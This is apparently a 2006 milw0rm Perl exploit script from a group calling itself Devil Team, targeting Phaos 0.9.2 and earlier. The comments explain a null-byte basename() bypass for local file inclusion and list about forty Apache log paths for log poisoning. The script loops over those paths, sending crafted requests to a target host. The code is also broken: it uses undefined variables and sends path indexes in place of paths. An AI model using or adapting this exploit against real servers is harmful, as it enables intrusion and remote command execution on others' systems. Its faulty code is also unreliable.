#!/usr/bin/perl

use IO::Socket;
use LWP::Simple;


#/*
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#- Phaos &lt;= 0.9.2 basename() Remote Command Execution Exploit
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#- [Script name: Phaos v. 0.9.2
#- [Script site: http://sourceforge.net/projects/phaosrpg/
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#-          Find by: Kacper (a.k.a Rahim)
#+		  
#-          Contact: kacper1964@yahoo.pl   
#-                        or   
#-          http://www.devilteam.yum.pl/
#-                       and 
#-           http://www.rahim.webd.pl/
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#- Special Greetz: DragonHeart ;-)
#- Ema: Leito, Adam, DeathSpeed, Drzewko, pepi
#-
#!@ Przyjazni nie da sie zamienic na marne korzysci @!
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#-            Z Dedykacja dla osoby,
#-         bez ktorej nie mogl bym zyc...
#-           K.C:* J.M (a.k.a Magaja)
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#*/
#/*
#vulnerable code include_lang.php &lt;_ line: 2-3:
#.....
#    @include (&quot;lang/en.php&quot;);
#    @include (&quot;lang/&quot;.basename($lang).&quot;.php&quot;);
#.....
#this check can be bypassed by supplying a well crafted value for lang argument:
#
#../../../../../../../apache/logs/access.log[null char]/eng
#
#basename() returns &#039;eng&#039; and eng.php is an existing file in lang/ folder
#
#../../../../../../../apache/logs/access.log[null char]
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#shop_include.php line 5:
#...
#include_once (&quot;lang/&quot;.$lang.&quot;.php&quot;);
#...
#u can include an arbitrary file from local resources
#possible locations:
#../../../../../var/log/httpd/access_log
#../../../../../var/log/httpd/error_log
#../apache/logs/error.log
#../apache/logs/access.log
#../../apache/logs/error.log
#../../apache/logs/access.log
#../../../apache/logs/error.log
#../../../apache/logs/access.log
#../../../../apache/logs/error.log
#../../../../apache/logs/access.log
#../../../../../apache/logs/error.log
#../../../../../apache/logs/access.log
#../logs/error.log
#../logs/access.log
#../../logs/error.log
#../../logs/access.log
#../../../logs/error.log
#../../../logs/access.log
#../../../../logs/error.log
#../../../../logs/access.log
#../../../../../logs/error.log
#../../../../../logs/access.log
#../../../../../etc/httpd/logs/access_log
#../../../../../etc/httpd/logs/access.log
#../../../../../etc/httpd/logs/error_log
#../../../../../etc/httpd/logs/error.log
#../../../../../var/www/logs/access_log
#../../../../../var/www/logs/access.log
#../../../../../usr/local/apache/logs/access_log
#../../../../../usr/local/apache/logs/access.log
#../../../../../var/log/apache/access_log
#../../../../../var/log/apache/access.log
#../../../../../var/log/access_log
#../../../../../var/www/logs/error_log
#../../../../../var/www/logs/error.log
#../../../../../usr/local/apache/logs/error_log
#../../../../../usr/local/apache/logs/error.log
#../../../../../var/log/apache/error_log
#../../../../../var/log/apache/error.log
#../../../../../var/log/access_log
#../../../../../var/log/error_log
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#*/

print &quot;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n&quot;;
print &quot;+          - - [DEVIL TEAM THE BEST POLISH TEAM] - -         +\n&quot;;
print &quot;+ Phaos &lt;= 0.9.2 basename() Remote Command Execution Exploit +\n&quot;;
print &quot;+                http://www.rahim.webd.pl/                   +\n&quot;;
print &quot;+                Find by: Kacper (a.k.a Rahim)               +\n&quot;;
print &quot;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n&quot;;

if (@ARGV &lt; 2)
{
	print &quot;[*] Uzycie/Usage: phaos.pl [host] [path/folder]\n\n&quot;;
	exit();
}


@paths=(
&quot;../../../../../var/log/httpd/access_log&quot;,
&quot;../../../../../var/log/httpd/error_log&quot;,
&quot;../apache/logs/error.log&quot;,
&quot;../apache/logs/access.log&quot;,
&quot;../../apache/logs/error.log&quot;,
&quot;../../apache/logs/access.log&quot;,
&quot;../../../apache/logs/error.log&quot;,
&quot;../../../apache/logs/access.log&quot;,
&quot;../../../../apache/logs/error.log&quot;,
&quot;../../../../apache/logs/access.log&quot;,
&quot;../../../../../apache/logs/error.log&quot;,
&quot;../../../../../apache/logs/access.log&quot;,
&quot;../logs/error.log&quot;,
&quot;../logs/access.log&quot;,
&quot;../../logs/error.log&quot;,
&quot;../../logs/access.log&quot;,
&quot;../../../logs/error.log&quot;,
&quot;../../../logs/access.log&quot;,
&quot;../../../../logs/error.log&quot;,
&quot;../../../../logs/access.log&quot;,
&quot;../../../../../logs/error.log&quot;,
&quot;../../../../../logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/access_log&quot;,
&quot;../../../../../etc/httpd/logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/error_log&quot;,
&quot;../../../../../etc/httpd/logs/error.log&quot;,
&quot;../../../../../var/www/logs/access_log&quot;,
&quot;../../../../../var/www/logs/access.log&quot;,
&quot;../../../../../usr/local/apache/logs/access_log&quot;,
&quot;../../../../../usr/local/apache/logs/access.log&quot;,
&quot;../../../../../var/log/apache/access_log&quot;,
&quot;../../../../../var/log/apache/access.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/www/logs/error_log&quot;,
&quot;../../../../../var/www/logs/error.log&quot;,
&quot;../../../../../usr/local/apache/logs/error_log&quot;,
&quot;../../../../../usr/local/apache/logs/error.log&quot;,
&quot;../../../../../var/log/apache/error_log&quot;,
&quot;../../../../../var/log/apache/error.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/log/error_log&quot;
);
for ($i=0; $i&lt;=$#paths; $i++)
  {
 print &quot;Path : &quot;.$i.&quot;\n&quot;;
$sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;$server, Timeout  =&gt; 10, PeerPort=&gt;&quot;http(80)&quot;) || die &quot;nie mozna sie polaczyc z hostem/cannot connect to host :( \n&quot;;

  print $socket &quot;GET &quot;.$path.&quot;include_lang.php&amp;lang=&quot;.$i.&quot;%00/en HTTP/1.1\r\n&quot;;
  print $socket &quot;Host: &quot;.$serv.&quot;\r\n&quot;;
  print $socket &quot;Accept: */*\r\n&quot;;
  print $socket &quot;Connection: close\r\n\n&quot;;

    $out = &quot;&quot;;
    while ($answer = &lt;$sock&gt;) 
    {
    $out.=$answer;
    }
    close($sock);
 if ($out =~ m/_exppl_(.*?)_exppl_/ms)
  {
  print &quot;[+] Log File found ! [ $i ] \n\n&quot;;
  $log = $i;
  $i = $#path
  }
   
  }

#Pozdro dla wszystkich ;-)

# milw0rm.com [2006-08-24]
